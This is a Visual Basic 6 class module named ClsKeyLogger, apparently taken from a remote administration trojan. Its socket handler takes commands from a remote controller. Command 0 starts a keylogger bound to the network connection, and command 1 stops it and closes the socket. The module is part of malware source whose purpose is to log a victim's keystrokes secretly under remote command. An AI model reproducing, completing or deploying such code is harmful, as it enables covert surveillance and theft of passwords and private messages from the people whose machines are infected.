VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "ClsKeyLogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Public ID_Connection            As Long
Private m_Data                  As String

Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left(sBuf, lRet2 - 1)
        sBuf = Mid(sBuf, lRet2 + 1)

        Select Case sCommand
        
            Case 0
                StarKeyLogger ID_Connection
            Case 1
                EndKeyLogger
                WinSock32.WsClose ID_Connection
                ID_Connection = 0
                TerminateConnection ID
        End Select
                
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(ID, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub

Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
    ID_Connection = 0
    EndKeyLogger
End Sub

Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)
    
End Sub

Private Sub Class_Terminate()
    If ID_Connection Then
        WinSock32.WsClose ID_Connection
    End If
    EndKeyLogger
End Sub
